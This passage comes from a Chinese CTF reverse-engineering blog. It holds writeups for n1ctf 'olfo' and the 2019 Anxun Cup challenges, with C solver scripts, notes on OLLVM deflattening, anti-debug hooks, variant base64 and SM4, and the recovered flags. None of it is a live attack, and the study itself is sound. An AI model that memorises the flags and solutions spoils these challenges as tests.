class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> op[] = &#123;<span class="number">0xF0</span>, <span class="number">0xF2</span>, <span class="number">0xF3</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>,</span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0xF6</span>, <span class="number">0xF4</span>, <span class="number">0xF1</span>, <span class="number">0xF7</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> input[] = <span class="string">"aaaaaaaaaaaaaaaaa"</span>;</span><br><span class="line"><span class="keyword">char</span> s[<span class="number">50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">n = op[i]<span class="number">-0xf0</span>;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">s[k] = input[j] &amp; <span class="number">0xFF</span>;</span><br><span class="line">k++, i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">k--;</span><br><span class="line">input[j<span class="number">-1</span>] = s[k];</span><br><span class="line">i++; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">k--;</span><br><span class="line">temp = s[k];</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">temp += op[i+<span class="number">1</span>];</span><br><span class="line">i += <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> t = <span class="number">0</span>, ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(k == <span class="number">0</span>)</span><br><span class="line">t = i;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">t = s[k<span class="number">-1</span>];</span><br><span class="line">ans = t ^ temp;</span><br><span class="line"><span class="keyword">if</span>(k == <span class="number">0</span>)</span><br><span class="line">i = ans;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">s[k<span class="number">-1</span>] = ans;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">5</span>)</span><br><span class="line">&#123;</span><br><span class="line">j++;</span><br><span class="line">i++; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">6</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(k == <span class="number">0</span>)</span><br><span class="line">t = i;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">t = s[k<span class="number">-1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(t == <span class="number">0</span> || t == <span class="number">10</span>)</span><br><span class="line">i += <span class="number">3</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">i += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">7</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> _64 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(input[_64])</span><br><span class="line">&#123;</span><br><span class="line">_64++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(j == _64)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(input); i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, input[i]); </span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实就只有异或和加减操作，简答逆一下即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">11</span>,  <span class="number">12</span>,   <span class="number">5</span>,  <span class="number">19</span>,  <span class="number">73</span>,  <span class="number">87</span>,   <span class="number">3</span>,  <span class="number">91</span>,  <span class="number">13</span>,  <span class="number">12</span>, </span><br><span class="line">    <span class="number">4</span>,  <span class="number">10</span>,  <span class="number">20</span>,  <span class="number">75</span>,  <span class="number">84</span>,  <span class="number">82</span>,  <span class="number">83</span>,  <span class="number">31</span>,  <span class="number">26</span>,  <span class="number">84</span>, </span><br><span class="line">   <span class="number">86</span>,  <span class="number">86</span>,  <span class="number">73</span>,  <span class="number">76</span>,   <span class="number">2</span>,  <span class="number">91</span>,  <span class="number">94</span>,  <span class="number">72</span>,  <span class="number">74</span>,  <span class="number">83</span>, </span><br><span class="line">   <span class="number">82</span>,   <span class="number">4</span>,  <span class="number">83</span>,  <span class="number">84</span>,   <span class="number">2</span>,  <span class="number">92</span>,  <span class="number">11</span>,   <span class="number">3</span>,   <span class="number">6</span>,   <span class="number">2</span>, </span><br><span class="line">   <span class="number">69</span>, <span class="number">125</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">40</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">ida_[i] = (ida_[i]^ida_[i+<span class="number">1</span>])<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">42</span>; i++)</span><br><span class="line"><span class="built_in">putchar</span>(ida_[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//flag&#123;5aa97418-e2a1-4a4c-ba9d-d6eb0ed91147&#125;</span></span><br></pre></td></tr></table></figure><p>后面问了出题师傅，才知道那个是可以修复一下的。其实就是switch语句的每个跳转用了一张表来存储，但由于基地址等对不上，导致分析出错。</p><p>所以首先修改与表对应的基地址，然后恢复储存跳转的表。<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200912172413213.png" alt="image-20200912172413213"></p><p>最后手动修改swicth的声明：<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200912172623345.png" alt="image-20200912172623345"></p><h2 id="olfo-10-17-n1ctf"><a href="#olfo-10-17-n1ctf" class="headerlink" title="olfo(10.17 n1ctf)"></a>olfo(10.17 n1ctf)</h2><p>首先打开ida看不到发现没有找到main函数，这是加了花指令，ida找不到。。从start可以看到。</p><p>花指令很少（2种）也很简单，手动去除都可。。</p><p>jmp</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20201017173801189.png" alt="image-20201017173801189"></p><p>call</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20201017173819199.png" alt="image-20201017173819199"></p><p>然后就是用fork()函数创建一个子进程，返回2次，当是父进程时返回一个大于0的数，且在父进程使用ptrace函数获得一些后面异或需要的数据。<img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20201017174401711.png" alt="image-20201017174401711"></p><p>对于我，关键就是fork（）多进程的调试，这里ida我动调一直在wait状态。。</p><p>然后找到gdb多进程调试。使用<strong>set follow-fork-mode [parent|child]</strong>指定调试的进程，用<strong>show follow-fork-mode</strong>查看被调试的进程。<a href="https://blog.csdn.net/fingding/article/details/46459095" target="_blank" rel="noopener">fork 多进程调试</a></p><p>其它的就不说了，最后直接idapython得到flag。</p><p>还有就是一篇关于ptrace理解的文章（很详细）：<a href="https://www.cnblogs.com/mysky007/p/11047943.html" target="_blank" rel="noopener">ptrace</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;平时一些零散的CTF题的记录。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Reverse" scheme="https://www.Bxnop.cn/categories/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>2019安洵杯</title>
    <link href="https://www.bxnop.cn/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/"/>
    <id>https://www.bxnop.cn/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/</id>
    <published>2020-07-27T07:55:30.000Z</published>
    <updated>2020-09-16T09:34:21.436Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>举办这个比赛时自己还不知道什么是CTF，由于是在自己学校进行的，有点这个比赛的印象。入逆向后，最近把re做了下。</strong></p></blockquote><a id="more"></a><h2 id="Easy-Encryption"><a href="#Easy-Encryption" class="headerlink" title="Easy_Encryption"></a>Easy_Encryption</h2><p>提示很多，直接找到main函数，简单分析一下，对输入flag进行2个加密函数后，最后与一个已知密文比较。其中第二个明显的base64加密。</p><p>来到一个加密函数，由于ida栈顶分析失败导致，直接alt+k修改一下就可以了。<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815162136204.png" alt="image-20200815162136204"></p><p>愉快的看伪代码，一个注意的地方：<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815162346063.png" alt="image-20200815162346063"></p><p>直接简单的爆破。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"artqkoehqpkbihv"</span>, i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> base[] = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; base[i]; i++)</span><br><span class="line">base[i] = <span class="built_in">abs</span>(base[i]<span class="number">-97</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= s[i]; i++)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">97</span>; j &lt;= <span class="number">122</span>; j++)</span><br><span class="line"><span class="keyword">if</span>((j+base[i]<span class="number">-97</span>)%<span class="number">26</span>+<span class="number">97</span> == s[i])</span><br><span class="line"><span class="built_in">putchar</span>(j);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag: umpnineissogood</span></span><br></pre></td></tr></table></figure><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>ida载入后，发现伪代码十分难看。。。看了一会儿，实在不想分析了，所有函数都是一种形式，感觉是什么混淆代码的技术。</p><p>百度后，发现是ollvm，控制流平坦化技术。</p><blockquote><p>控制流平坦化(control flow flattening)的基本思想主要是通过一个主分发器来控制程序基本块的执行流程，这个主分发器就是函数中的switch语句。</p></blockquote><p>且目前可以利用符号执行来去除控制流平坦化。<a href="https://security.tencent.com/index.php/blog/msg/112" target="_blank" rel="noopener">利用符号执行去除控制流平坦化</a></p><p>而这也需要angr，网上说的都是建议安装在python虚拟环境中。</p><p>跟着教程安装完虚拟环境并创建后，但angr又安装失败。。。后面发现还可以直接用dokcer。</p><p>了解一波docker，<a href="https://www.cnblogs.com/blog-rui/p/11244023.html" target="_blank" rel="noopener">docker</a>，折腾一些时间（谷歌大法帮了大忙👍）后成功执行deflat.py脚本。<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815165930112.png" alt="image-20200815165930112"></p><p>又是愉快的伪代码，简单就不分析了，使用gdb动调出2个对比的数独表，找出差异的数字，即0所在位置。<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815170400494.png" alt="image-20200815170400494"></p><p>然后使用notepad++找不不同：<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815170436332.png" alt="image-20200815170436332"></p><p>最后简单解密一下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"4693641762894685722843556137219876255986"</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>, count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; s[i]; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">33</span>; j &lt;= <span class="number">122</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(((j&amp;<span class="number">0xf3</span> | ~j&amp;<span class="number">0xc</span>)<span class="number">-20</span>) == s[i])</span><br><span class="line">&#123;</span><br><span class="line">s[i] = j;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s); i += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> temp = s[i];</span><br><span class="line">s[i] = s[i+<span class="number">1</span>];</span><br><span class="line">s[i+<span class="number">1</span>] = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">k = <span class="built_in">strlen</span>(s)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(s)/<span class="number">2</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> temp = s[k];</span><br><span class="line">s[k] = s[i];</span><br><span class="line">s[i] = temp;</span><br><span class="line">k++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(s);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//flag: KDEEIFGKIJ@AFGEJAEF@FDKADFGIJFA@FDE@JG@J</span></span><br></pre></td></tr></table></figure><h2 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h2><p>打开程序，出现hooked，表示已经对程序中的的函数hook成功。</p><p>而之前我也在逆向工程核心原理一书中看到过该章节的一点内容，它的介绍：</p><blockquote><p><strong>代码逆向分析中，钩取（hooking）是一种截取信息，更改程序流程，添加新功能的技术。</strong></p></blockquote><p>ida中找到main函数后，会发现很奇怪，有一个异常，且没有操作输入flag的函数，猜测是hook改变了程序的程序流程。但可以通过数据交叉引用找到关键函数。</p><p>看了一下所有与计算输入数据与比较数据相关的函数，了解大致流程后，OD进行动调看看：</p><p>其中main函数中的MessageBox函数执行后并没有正常的执行，而是跳到了一个新的函数，也是ida中分析过的过数据加密的函数。结合ida继续动调：<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815173123252.png" alt="image-20200815173123252"></p><p>OD中看到跳到的main函数触发异常的地方，但是程序无法处理的异常。。。<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815173417257.png" alt="image-20200815173417257"></p><p>那上图中的<strong>TopLevelExceptionFilter</strong>关键加密函数不执行的嘛。。使用PEtools来dump出正常执行的程序看到数据改变了的，那是执行了的。。</p><p>百度一下<strong>SetUnhandledExceptionFilter(TopLevelExceptionFilter)</strong>函数：<strong>简单来说就是设置一个发生异常处理的函数，且它会将原来默认处理异常的函数hook掉。且我们的程序要不处于调试状态才会去执行它设置的异常处理函数。<a href="https://blog.csdn.net/xiaoyafang123/article/details/52161106" target="_blank" rel="noopener">介绍</a></strong> </p><p>参数：lpTopLevelExceptionFilter 函数指针。当异常发生时，且程序不处于调试模式（在vs或者别的调试器里运行）则首先调用该函数。<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815175235431.png" alt="image-20200815175235431"></p><p>程序流程清楚了，开始分析算法：</p><p>第二个加密函数变种的base64，但第一个看不出什么名堂，自己逆的话感觉工程量肯定大且很大几率搞不出来。。</p><p>就想着先把变种的base64先解密，但一直解密乱码。。不能啊，自己也写了2个函数来测试，能将变种加密的base64还原为正常base64加密的，但题中的密文不行，。。</p><p>模拟本题的变种base64加密（也是从模拟发现是base64的）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [esp+E4h] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+F0h] [ebp-50h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [esp+FCh] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+108h] [ebp-38h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+114h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// [esp+120h] [ebp-20h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+12Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+138h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> temp = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">char</span> str[] = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/"</span>;</span><br><span class="line">  <span class="keyword">char</span> Str[] = <span class="string">"123456"</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  <span class="keyword">if</span> ( v8 % <span class="number">3</span> )</span><br><span class="line">    v9 = <span class="number">4</span> * (v8 / <span class="number">3</span>) + <span class="number">4</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v9 = <span class="number">4</span> * (v8 / <span class="number">3</span>);</span><br><span class="line">  v7 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*(v9+<span class="number">1</span>));</span><br><span class="line">  v7[v9] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v8; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">3</span>; ++j )</span><br><span class="line">      v3 |= (<span class="keyword">unsigned</span> __int8)Str[j + i] &lt;&lt; <span class="number">8</span> * (<span class="number">2</span> - j);</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( k &gt;= <span class="number">4</span> - (i + <span class="number">3</span> - v8) &amp;&amp; i + <span class="number">3</span> &gt; v8 )</span><br><span class="line">        v7[v5] = <span class="string">'!'</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        temp = (((v3 &gt;&gt; <span class="number">6</span> * (<span class="number">3</span> - k)) &amp; <span class="number">0x3F</span>)+<span class="number">24</span>)%<span class="number">64</span>, v7[v5] = str[temp], <span class="built_in">printf</span>(<span class="string">"%d "</span>, temp);;</span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="built_in">puts</span>(v7); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//加密后：KRGlLBSo</span></span><br></pre></td></tr></table></figure><p>还原成正常加密的base64密文：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"KRGlLBSo"</span>;</span><br><span class="line"><span class="keyword">char</span> s[] = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>;</span><br><span class="line"><span class="keyword">char</span> a1[] = &#123;<span class="number">20</span>, <span class="number">53</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">41</span>, <span class="number">36</span>,</span><br><span class="line"> <span class="number">14</span>, <span class="number">50</span>, <span class="number">22</span>, <span class="number">18</span>, <span class="number">47</span>, <span class="number">6</span>, <span class="number">38</span>, <span class="number">63</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">24</span>, <span class="number">5</span>, <span class="number">17</span>, <span class="number">56</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; a[i]; i++)</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">64</span>; j++)</span><br><span class="line"><span class="keyword">if</span>(a[i] == s[j])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> t = j;</span><br><span class="line"><span class="keyword">if</span>(t &lt;= <span class="number">25</span>)</span><br><span class="line">t += <span class="number">26</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(t &lt;= <span class="number">51</span>)</span><br><span class="line">t -= <span class="number">26</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">64</span>; k++)</span><br><span class="line"><span class="keyword">if</span>((k+<span class="number">24</span>)%<span class="number">64</span> == t)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">putchar</span>(s[k]);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//还原为正常base64加密密文：MTIzNDU2</span></span><br></pre></td></tr></table></figure><p>正常base64解密：可以看到，解密出明文。<img src="/2020/07/27/2019%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20200815181032181.png" alt="image-20200815181032181"></p><p>就这样卡住了。。。也无心看第一个加密了。</p><p>不行，去看了看writeup，原来这个解密出本来就是乱码，转化为16进制就好。。。又直接看了第一个加密是sm4。。</p><p>它在加密中其实有标志的：<strong>一是表，二是0xA3B1BAC6</strong><img 